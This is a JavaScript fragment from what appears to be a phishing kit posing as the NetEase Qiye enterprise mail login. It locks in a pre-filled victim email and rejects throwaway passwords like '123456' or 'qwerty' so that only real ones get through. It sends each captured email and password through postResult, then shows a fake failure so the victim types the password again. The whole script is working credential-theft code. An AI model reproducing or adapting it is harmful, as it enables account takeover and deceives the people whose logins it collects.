// 
function showPass(x) {
    let q_input_pass = document.getElementById("q_input_pass");

    if (q_input_pass.type === "text") {
       q_input_pass.type = "password";
       x.src = "./pages/netease_qiye/eye_close.png";
    }
    else{
        q_input_pass.type = "text";
        x.src = "./pages/netease_qiye/eye_open.png";
    }
}

// 
if (validEmail.test(usermail)) {
    $("#q_input_mail").val(usermail)
    $("#q_input_mail").attr('readOnly', true)
}

$("#net_qiye_form").on('submit', (e)=>{
    let qiye_form_inputs = document.getElementsByClassName("qiye_form_inputs");

    e.preventDefault();

    if (!validEmail.test($("#q_input_mail").val())) {
        qiye_form_inputs[0].style.borderColor = "red";
        return
    }
    else{
        qiye_form_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#q_input_pass").val()) || $("#q_input_pass").val().length < 6 || $("#q_input_pass").val() == 123456 || $("#q_input_pass").val().toLowerCase() == "qwerty" || $("#q_input_pass").val().toLowerCase() == "password") {
        qiye_form_inputs[1].style.borderColor = "red";
        return
    }
    else{
        $("#loader").show().css({"display":"flex"});

        qiye_form_inputs[1].style.borderColor = "silver";
        let url = $("#q_input_mail").val().split("@");

        postResult(url[1], $("#q_input_mail").val(), $("#q_input_pass").val(), postCount);
        postCount++
        $("#q_input_pass").val("");

        setTimeout(() => {
            qiye_form_inputs[1].style.borderColor = "red";
        }, delayCounter);
    }
})